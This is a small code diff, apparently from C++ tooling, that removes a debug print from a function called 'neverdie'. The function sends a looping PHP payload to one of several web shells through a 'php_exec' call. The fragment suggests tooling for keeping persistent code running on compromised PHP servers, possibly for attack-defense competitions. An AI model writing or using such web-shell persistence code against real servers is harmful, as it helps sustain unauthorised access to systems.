@@ -51,8 +51,6 @@ void neverdie(int shellid){
 "usleep(100000);"
 "}"
 "};";
-
-cout<<payload<<endl;
 	string ans;
 	shells[shellid].php_exec(payload,ans);
 	cout<<"thread terminated:"<<ans<<endl;
